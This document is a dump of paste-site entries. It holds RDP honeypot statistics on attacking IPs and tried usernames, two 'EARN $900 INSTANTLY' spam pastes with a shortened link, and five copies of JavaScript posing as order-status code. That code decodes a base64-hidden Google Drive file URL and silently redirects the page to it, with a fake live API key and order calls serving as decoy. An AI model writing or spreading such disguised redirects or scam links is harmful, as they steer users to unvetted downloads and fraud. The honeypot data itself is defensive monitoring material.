id,title,username,language,date,content
8yL0pkU7,2025-04-17_stats.json,rdp_snitch,JSON,Thursday 17th of April 2025 07:18:06 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 7302,
    ""211.185.207.14"": 57,
    ""71.82.170.60"": 24,
    ""80.94.95.198"": 39,
    ""194.165.17.21"": 42,
    ""198.235.24.169"": 9,
    ""167.94.145.107"": 3,
    ""80.94.95.90"": 6,
    ""167.94.138.42"": 3,
    ""88.214.50.50"": 18,
    ""92.255.57.11"": 6,
    ""147.185.132.57"": 9,
    ""194.180.49.123"": 3,
    ""58.218.199.219"": 12,
    ""45.227.254.155"": 6,
    ""194.165.16.166"": 6,
    ""205.210.31.90"": 9,
    ""209.97.162.249"": 3,
    ""193.29.13.50"": 3,
    ""159.89.6.147"": 420,
    ""118.193.58.187"": 3,
    ""173.225.111.171"": 6,
    ""205.210.31.249"": 9
  },
  ""asn"": {
    ""AS212238"": 7302,
    ""AS4766"": 57,
    ""AS20115"": 24,
    ""AS204428"": 45,
    ""AS48721"": 48,
    ""AS396982"": 36,
    ""AS398705"": 3,
    ""AS398324"": 3,
    ""Unknown"": 18,
    ""AS207566"": 6,
    ""AS201814"": 3,
    ""AS4134"": 12,
    ""AS267784"": 6,
    ""AS14061"": 423,
    ""AS42397"": 3,
    ""AS135377"": 3,
    ""AS19318"": 6
  },
  ""isp"": {
    ""Datacamp Limited"": 7302,
    ""Korea Telecom"": 57,
    ""Charter Communications"": 24,
    ""SS-Net"": 45,
    ""Flyservers S.A."": 54,
    ""Google LLC"": 36,
    ""Censys, Inc."": 6,
    ""SIA \""Singularity Telecom\"""": 18,
    ""Chang Way Technologies Co. Limited"": 6,
    ""MEVSPACE sp. z o.o."": 3,
    ""Chinanet"": 12,
    ""DigitalOcean, LLC"": 423,
    ""Bunea TELECOM SRL"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Interserver, Inc"": 6
  },
  ""org"": {
    ""Datacamp Limited"": 7302,
    ""Kornet"": 57,
    ""Spectrum"": 24,
    ""Unmanaged LTD"": 45,
    ""Flyservers S.A"": 48,
    ""Palo Alto Networks, Inc"": 36,
    ""Censys, Inc."": 3,
    ""Censys, Inc"": 3,
    ""SIA \""Singularity Telecom\"""": 18,
    ""Chang Way Technologies Co. Limited"": 6,
    ""HostSlick"": 3,
    ""Chinanet JS"": 12,
    ""Xwin Universal LTD"": 6,
    ""DigitalOcean, LLC"": 423,
    ""Bunea TELECOM SRL"": 3,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Interserver, Inc"": 6
  },
  ""regionName"": {
    ""North West"": 7302,
    ""Sejong-si"": 57,
    ""Wisconsin"": 24,
    ""Budapest"": 45,
    ""Kaunas"": 48,
    ""California"": 36,
    ""Michigan"": 6,
    ""New York"": 18,
    ""Moscow"": 6,
    ""Bavaria"": 3,
    ""Jiangsu"": 12,
    ""Vilnius"": 6,
    ""South West"": 3,
    ""Timi\u0219 County"": 3,
    ""Hesse"": 423,
    ""New Jersey"": 6
  },
  ""country"": {
    ""Singapore"": 7305,
    ""South Korea"": 57,
    ""United States"": 90,
    ""Hungary"": 45,
    ""Lithuania"": 54,
    ""Russia"": 6,
    ""Germany"": 426,
    ""China"": 12,
    ""Romania"": 3
  },
  ""account"": {
    ""hello"": 7740,
    ""142.93.8.59"": 162,
    ""FjPAiKsLS"": 3,
    ""qiHMXy"": 3,
    ""ApmmBj"": 3,
    ""(empty)"": 6,
    ""Administr"": 15,
    ""Domain"": 18,
    ""fxdiCdqDL"": 3,
    ""KkFJGW"": 3,
    ""aXxacq"": 3,
    ""Test"": 18,
    ""SsjFAKjaD"": 3,
    ""paKtjN"": 3,
    ""YjihJO"": 3,
    ""Administrator"": 3,
    ""pXvQQkfcQ"": 3,
    ""aMLdca"": 3,
    ""kDHBhl"": 3
  },
  ""keyboard"": {
    ""Unknown"": 7998
  },
  ""client_build"": {
    ""Unknown"": 7998
  },
  ""client_name"": {
    ""Unknown"": 7998
  },
  ""ip_type"": {
    ""hosting & proxy"": 7302,
    ""Unknown"": 210,
    ""hosting"": 468,
    ""proxy"": 18
  }
}"
Xed8e9un,2025-04-17_stats.json,rdp_snitch,JSON,Thursday 17th of April 2025 07:16:08 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 4868,
    ""211.185.207.14"": 38,
    ""71.82.170.60"": 16,
    ""80.94.95.198"": 26,
    ""194.165.17.21"": 28,
    ""198.235.24.169"": 6,
    ""167.94.145.107"": 2,
    ""80.94.95.90"": 4,
    ""167.94.138.42"": 2,
    ""88.214.50.50"": 12,
    ""92.255.57.11"": 4,
    ""147.185.132.57"": 6,
    ""194.180.49.123"": 2,
    ""58.218.199.219"": 8,
    ""45.227.254.155"": 4,
    ""194.165.16.166"": 4,
    ""205.210.31.90"": 6,
    ""209.97.162.249"": 2,
    ""193.29.13.50"": 2,
    ""159.89.6.147"": 280,
    ""118.193.58.187"": 2,
    ""173.225.111.171"": 4,
    ""205.210.31.249"": 6
  },
  ""asn"": {
    ""AS212238"": 4868,
    ""AS4766"": 38,
    ""AS20115"": 16,
    ""AS204428"": 30,
    ""AS48721"": 32,
    ""AS396982"": 24,
    ""AS398705"": 2,
    ""AS398324"": 2,
    ""Unknown"": 12,
    ""AS207566"": 4,
    ""AS201814"": 2,
    ""AS4134"": 8,
    ""AS267784"": 4,
    ""AS14061"": 282,
    ""AS42397"": 2,
    ""AS135377"": 2,
    ""AS19318"": 4
  },
  ""isp"": {
    ""Datacamp Limited"": 4868,
    ""Korea Telecom"": 38,
    ""Charter Communications"": 16,
    ""SS-Net"": 30,
    ""Flyservers S.A."": 36,
    ""Google LLC"": 24,
    ""Censys, Inc."": 4,
    ""SIA \""Singularity Telecom\"""": 12,
    ""Chang Way Technologies Co. Limited"": 4,
    ""MEVSPACE sp. z o.o."": 2,
    ""Chinanet"": 8,
    ""DigitalOcean, LLC"": 282,
    ""Bunea TELECOM SRL"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Interserver, Inc"": 4
  },
  ""org"": {
    ""Datacamp Limited"": 4868,
    ""Kornet"": 38,
    ""Spectrum"": 16,
    ""Unmanaged LTD"": 30,
    ""Flyservers S.A"": 32,
    ""Palo Alto Networks, Inc"": 24,
    ""Censys, Inc."": 2,
    ""Censys, Inc"": 2,
    ""SIA \""Singularity Telecom\"""": 12,
    ""Chang Way Technologies Co. Limited"": 4,
    ""HostSlick"": 2,
    ""Chinanet JS"": 8,
    ""Xwin Universal LTD"": 4,
    ""DigitalOcean, LLC"": 282,
    ""Bunea TELECOM SRL"": 2,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Interserver, Inc"": 4
  },
  ""regionName"": {
    ""North West"": 4868,
    ""Sejong-si"": 38,
    ""Wisconsin"": 16,
    ""Budapest"": 30,
    ""Kaunas"": 32,
    ""California"": 24,
    ""Michigan"": 4,
    ""New York"": 12,
    ""Moscow"": 4,
    ""Bavaria"": 2,
    ""Jiangsu"": 8,
    ""Vilnius"": 4,
    ""South West"": 2,
    ""Timi\u0219 County"": 2,
    ""Hesse"": 282,
    ""New Jersey"": 4
  },
  ""country"": {
    ""Singapore"": 4870,
    ""South Korea"": 38,
    ""United States"": 60,
    ""Hungary"": 30,
    ""Lithuania"": 36,
    ""Russia"": 4,
    ""Germany"": 284,
    ""China"": 8,
    ""Romania"": 2
  },
  ""account"": {
    ""hello"": 5160,
    ""142.93.8.59"": 108,
    ""FjPAiKsLS"": 2,
    ""qiHMXy"": 2,
    ""ApmmBj"": 2,
    ""(empty)"": 4,
    ""Administr"": 10,
    ""Domain"": 12,
    ""fxdiCdqDL"": 2,
    ""KkFJGW"": 2,
    ""aXxacq"": 2,
    ""Test"": 12,
    ""SsjFAKjaD"": 2,
    ""paKtjN"": 2,
    ""YjihJO"": 2,
    ""Administrator"": 2,
    ""pXvQQkfcQ"": 2,
    ""aMLdca"": 2,
    ""kDHBhl"": 2
  },
  ""keyboard"": {
    ""Unknown"": 5332
  },
  ""client_build"": {
    ""Unknown"": 5332
  },
  ""client_name"": {
    ""Unknown"": 5332
  },
  ""ip_type"": {
    ""hosting & proxy"": 4868,
    ""Unknown"": 140,
    ""hosting"": 312,
    ""proxy"": 12
  }
}"
hzynYFgz,Market.js,SpawnKz,JavaScript,Thursday 17th of April 2025 07:15:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68000/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HetMefCE,2025-04-17_stats.json,rdp_snitch,JSON,Thursday 17th of April 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 2434,
    ""211.185.207.14"": 19,
    ""71.82.170.60"": 8,
    ""80.94.95.198"": 13,
    ""194.165.17.21"": 14,
    ""198.235.24.169"": 3,
    ""167.94.145.107"": 1,
    ""80.94.95.90"": 2,
    ""167.94.138.42"": 1,
    ""88.214.50.50"": 6,
    ""92.255.57.11"": 2,
    ""147.185.132.57"": 3,
    ""194.180.49.123"": 1,
    ""58.218.199.219"": 4,
    ""45.227.254.155"": 2,
    ""194.165.16.166"": 2,
    ""205.210.31.90"": 3,
    ""209.97.162.249"": 1,
    ""193.29.13.50"": 1,
    ""159.89.6.147"": 140,
    ""118.193.58.187"": 1,
    ""173.225.111.171"": 2,
    ""205.210.31.249"": 3
  },
  ""asn"": {
    ""AS212238"": 2434,
    ""AS4766"": 19,
    ""AS20115"": 8,
    ""AS204428"": 15,
    ""AS48721"": 16,
    ""AS396982"": 12,
    ""AS398705"": 1,
    ""AS398324"": 1,
    ""Unknown"": 6,
    ""AS207566"": 2,
    ""AS201814"": 1,
    ""AS4134"": 4,
    ""AS267784"": 2,
    ""AS14061"": 141,
    ""AS42397"": 1,
    ""AS135377"": 1,
    ""AS19318"": 2
  },
  ""isp"": {
    ""Datacamp Limited"": 2434,
    ""Korea Telecom"": 19,
    ""Charter Communications"": 8,
    ""SS-Net"": 15,
    ""Flyservers S.A."": 18,
    ""Google LLC"": 12,
    ""Censys, Inc."": 2,
    ""SIA \""Singularity Telecom\"""": 6,
    ""Chang Way Technologies Co. Limited"": 2,
    ""MEVSPACE sp. z o.o."": 1,
    ""Chinanet"": 4,
    ""DigitalOcean, LLC"": 141,
    ""Bunea TELECOM SRL"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Interserver, Inc"": 2
  },
  ""org"": {
    ""Datacamp Limited"": 2434,
    ""Kornet"": 19,
    ""Spectrum"": 8,
    ""Unmanaged LTD"": 15,
    ""Flyservers S.A"": 16,
    ""Palo Alto Networks, Inc"": 12,
    ""Censys, Inc."": 1,
    ""Censys, Inc"": 1,
    ""SIA \""Singularity Telecom\"""": 6,
    ""Chang Way Technologies Co. Limited"": 2,
    ""HostSlick"": 1,
    ""Chinanet JS"": 4,
    ""Xwin Universal LTD"": 2,
    ""DigitalOcean, LLC"": 141,
    ""Bunea TELECOM SRL"": 1,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Interserver, Inc"": 2
  },
  ""regionName"": {
    ""North West"": 2434,
    ""Sejong-si"": 19,
    ""Wisconsin"": 8,
    ""Budapest"": 15,
    ""Kaunas"": 16,
    ""California"": 12,
    ""Michigan"": 2,
    ""New York"": 6,
    ""Moscow"": 2,
    ""Bavaria"": 1,
    ""Jiangsu"": 4,
    ""Vilnius"": 2,
    ""South West"": 1,
    ""Timi\u0219 County"": 1,
    ""Hesse"": 141,
    ""New Jersey"": 2
  },
  ""country"": {
    ""Singapore"": 2435,
    ""South Korea"": 19,
    ""United States"": 30,
    ""Hungary"": 15,
    ""Lithuania"": 18,
    ""Russia"": 2,
    ""Germany"": 142,
    ""China"": 4,
    ""Romania"": 1
  },
  ""account"": {
    ""hello"": 2580,
    ""142.93.8.59"": 54,
    ""FjPAiKsLS"": 1,
    ""qiHMXy"": 1,
    ""ApmmBj"": 1,
    ""(empty)"": 2,
    ""Administr"": 5,
    ""Domain"": 6,
    ""fxdiCdqDL"": 1,
    ""KkFJGW"": 1,
    ""aXxacq"": 1,
    ""Test"": 6,
    ""SsjFAKjaD"": 1,
    ""paKtjN"": 1,
    ""YjihJO"": 1,
    ""Administrator"": 1,
    ""pXvQQkfcQ"": 1,
    ""aMLdca"": 1,
    ""kDHBhl"": 1
  },
  ""keyboard"": {
    ""Unknown"": 2666
  },
  ""client_build"": {
    ""Unknown"": 2666
  },
  ""client_name"": {
    ""Unknown"": 2666
  },
  ""ip_type"": {
    ""hosting & proxy"": 2434,
    ""Unknown"": 70,
    ""hosting"": 156,
    ""proxy"": 6
  }
}"
AmW5yHjC,EARN $900 INSTANTLY 2025 XH,sde235gud,JavaScript,Thursday 17th of April 2025 07:03:39 PM CDT," 
Pdf https://tinyurl.com/privguidee


dK6hbMZ6kD
"
JMsXAREz,Untitled,SpawnKz,JavaScript,Thursday 17th of April 2025 06:59:53 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/95605/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TBj7Up1A,EARN $900 INSTANTLY 2025⭐ 8F,Armany7800,JavaScript,Thursday 17th of April 2025 06:40:44 PM CDT," 
Pdf https://tinyurl.com/privguidee


oDXEhVgorT
"
SvC6Zh51,Products.js,Ratqueenkslskskwkw,JavaScript,Thursday 17th of April 2025 05:43:36 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20800/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kKzTYmE3,Order.js,Ratqueenkslskskwkw,JavaScript,Thursday 17th of April 2025 05:27:52 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/58480/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jz2v7YQX,Market.js,Ratqueenkslskskwkw,JavaScript,Thursday 17th of April 2025 05:12:30 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91412/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
